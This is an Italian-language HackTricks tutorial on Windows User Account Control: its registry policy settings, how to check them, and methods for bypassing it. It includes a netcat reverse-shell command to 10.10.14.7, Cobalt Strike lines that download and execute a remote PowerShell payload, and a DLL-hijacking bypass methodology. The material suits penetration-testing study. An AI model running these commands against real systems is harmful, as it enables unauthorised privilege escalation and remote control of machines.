# UAC - Controllo Account Utente

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti** della comunità **più avanzati** al mondo.\
Ottieni accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Il Controllo Account Utente (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **messaggio di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrità`, e un programma con un **alto livello** può eseguire compiti che **potrebbero compromettere il sistema**. Quando l'UAC è abilitato, le applicazioni e i compiti vengono sempre **eseguiti sotto il contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente queste applicazioni/compiti ad avere accesso di livello amministratore al sistema per essere eseguiti. È una funzionalità di comodità che protegge gli amministratori da modifiche non intenzionali ma non è considerata un confine di sicurezza.

Per ulteriori informazioni sui livelli di integrità:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando l'UAC è attivo, a un utente amministratore vengono forniti 2 token: una chiave per utente standard, per eseguire azioni regolari a livello normale, e una con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute in dettaglio come funziona l'UAC e include il processo di accesso, l'esperienza utente e l'architettura UAC. Gli amministratori possono utilizzare le politiche di sicurezza per configurare come funziona l'UAC specifico per la loro organizzazione a livello locale (utilizzando secpol.msc), o configurato e distribuito tramite Oggetti Criteri di Gruppo (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Criteri di Gruppo che possono essere impostate per l'UAC. La seguente tabella fornisce ulteriori dettagli:

| Impostazione Criteri di Gruppo                                                                                                                                                                                                                                                                                                                                                           | Chiave di Registro          | Impostazione Predefinita                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Controllo Account Utente: Modalità di Approvazione Amministrativa per l'account Amministratore integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                |
| [Controllo Account Utente: Consenti alle applicazioni UIAccess di richiedere elevazione senza utilizzare il desktop sicuro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                |
| [Controllo Account Utente: Comportamento del messaggio di elevazione per gli amministratori in Modalità di Approvazione Amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Richiesta di consenso per binari non Windows                |
| [Controllo Account Utente: Comportamento del messaggio di elevazione per utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Richiesta di credenziali sul desktop sicuro                 |
| [Controllo Account Utente: Rileva installazioni di applicazioni e richiedi elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Abilitato (predefinito per home) Disabilitato (predefinito per enterprise) |
| [Controllo Account Utente: Eleva solo eseguibili firmati e convalidati](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                |
| [Controllo Account Utente: Eleva solo le applicazioni UIAccess installate in posizioni sicure](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                   |
| [Controllo Account Utente: Esegui tutti gli amministratori in Modalità di Approvazione Amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                   |
| [Controllo Account Utente: Passa al desktop sicuro quando si richiede elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                   |
| [Controllo Account Utente: Virtualizza i fallimenti di scrittura di file e registro in posizioni per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                   |

### Teoria del Bypass UAC

Al alcuni programmi sono **autoelevati automaticamente** se l'**utente appartiene** al **gruppo amministratore**. Questi binari hanno all'interno dei loro _**Manifest**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve essere **firmato da Microsoft** anche.

Quindi, per **bypassare** l'**UAC** (elevare da **livello** di integrità **medio** a **alto**) alcuni attaccanti usano questo tipo di binari per **eseguire codice arbitrario** perché verrà eseguito da un **processo di alta integrità**.

Puoi **controllare** il _**Manifest**_ di un binario utilizzando lo strumento _**sigcheck.exe**_ di Sysinternals. E puoi **vedere** il **livello di integrità** dei processi utilizzando _Process Explorer_ o _Process Monitor_ (di Sysinternals).

### Controlla UAC

Per confermare se l'UAC è abilitato, fai:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se è **`1`** allora UAC è **attivato**, se è **`0`** o **non esiste**, allora UAC è **inattivo**.

Poi, controlla **quale livello** è configurato:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Se **`0`** allora, UAC non chiederà (come **disabilitato**)
- Se **`1`** l'amministratore è **richiesto di fornire nome utente e password** per eseguire il binario con diritti elevati (su Secure Desktop)
- Se **`2`** (**Sempre notificami**) UAC chiederà sempre conferma all'amministratore quando tenta di eseguire qualcosa con privilegi elevati (su Secure Desktop)
- Se **`3`** come `1` ma non necessariamente su Secure Desktop
- Se **`4`** come `2` ma non necessariamente su Secure Desktop
- se **`5`**(**predefinito**) chiederà all'amministratore di confermare l'esecuzione di binari non Windows con privilegi elevati

Poi, devi dare un'occhiata al valore di **`LocalAccountTokenFilterPolicy`**\
Se il valore è **`0`**, allora, solo l'utente **RID 500** (**Amministratore integrato**) è in grado di eseguire **compiti di amministrazione senza UAC**, e se è `1`, **tutti gli account all'interno del gruppo "Administrators"** possono farlo.

E, infine, dai un'occhiata al valore della chiave **`FilterAdministratorToken`**\
Se **`0`**(predefinito), l'**account Amministratore integrato può** eseguire compiti di amministrazione remota e se **`1`** l'account Amministratore integrato **non può** eseguire compiti di amministrazione remota, a meno che `LocalAccountTokenFilterPolicy` non sia impostato su `1`.

#### Riepilogo

- Se `EnableLUA=0` o **non esiste**, **nessun UAC per nessuno**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1`, Nessun UAC per nessuno**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, Nessun UAC per RID 500 (Amministratore integrato)**
- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC per tutti**

Tutte queste informazioni possono essere raccolte utilizzando il modulo **metasploit**: `post/windows/gather/win_privs`

Puoi anche controllare i gruppi del tuo utente e ottenere il livello di integrità:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!NOTE]
> Nota che se hai accesso grafico alla vittima, il bypass UAC è semplice poiché puoi semplicemente cliccare su "Sì" quando appare il prompt UAC.

Il bypass UAC è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo sta girando in un contesto di integrità media e il tuo utente appartiene al gruppo degli amministratori**.

È importante menzionare che è **molto più difficile bypassare l'UAC se è al livello di sicurezza più alto (Always) rispetto a quando è in uno degli altri livelli (Default).**

### UAC disabilitato

Se l'UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **eseguire una reverse shell con privilegi di amministratore** (livello di integrità alto) utilizzando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass UAC con duplicazione del token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Base UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che è all'interno del gruppo Administrators puoi **montare il C$** condiviso tramite SMB (file system) localmente in un nuovo disco e avrai **accesso a tutto all'interno del file system** (anche alla cartella home dell'Amministratore).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass UAC con Cobalt Strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al suo massimo livello di sicurezza.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per **bypassare** il **UAC**.

### KRBUACBypass

Documentazione e strumento in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Sfruttamenti del bypass UAC

[**UACME** ](https://github.com/hfiref0x/UACME)che è una **compilazione** di diversi sfruttamenti del bypass UAC. Nota che dovrai **compilare UACME utilizzando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`), dovrai sapere **quale ti serve.**\
Dovresti **fare attenzione** perché alcuni bypass potrebbero **richiedere alcuni altri programmi** che **avviseranno** l'**utente** che sta accadendo qualcosa.

UACME ha la **versione di build da cui ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che influisce sulle tue versioni:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, utilizzando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina puoi ottenere la versione di Windows `1607` dalle versioni di build.

#### Ulteriori bypass UAC

**Tutte** le tecniche utilizzate qui per bypassare l'AUC **richiedono** una **shell interattiva completa** con la vittima (una comune shell nc.exe non è sufficiente).

Puoi ottenerla utilizzando una sessione **meterpreter**. Migra a un **processo** che ha il valore **Session** uguale a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### Bypass UAC con GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando lo ricevi, non hai davvero bisogno di un bypass. Quindi, ottenere accesso a una GUI ti permetterà di bypassare l'UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava utilizzando (potenzialmente tramite RDP) ci sono **alcuni strumenti che verranno eseguiti come amministratore** da dove potresti **eseguire** un **cmd** ad esempio **come admin** direttamente senza essere nuovamente sollecitato dall'UAC come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **furtivo**.

### Bypass UAC rumoroso con brute-force

Se non ti importa di essere rumoroso, potresti sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi fino a quando l'utente non lo accetta**.

### Il tuo bypass - Metodologia di base per il bypass UAC

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo il dll malevolo su _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Trova un binario che si **autoelevi** (controlla che quando viene eseguito funzioni a un livello di integrità elevato).
2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** il DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo utilizzando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Permette di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo strumento viene eseguito da un livello di integrità elevato).
   2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare il tuo DLL all'interno del percorso protetto ed eseguire il binario vulnerabile e autoelevato.

### Un'altra tecnica di bypass UAC

Consiste nel controllare se un **binario autoElevato** cerca di **leggere** dal **registro** il **nome/percorso** di un **binario** o **comando** da eseguire (questo è più interessante se il binario cerca queste informazioni all'interno del **HKCU**).

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) per costruire e **automatizzare facilmente i flussi di lavoro** alimentati dagli strumenti **più avanzati** della comunità.\
Accedi oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
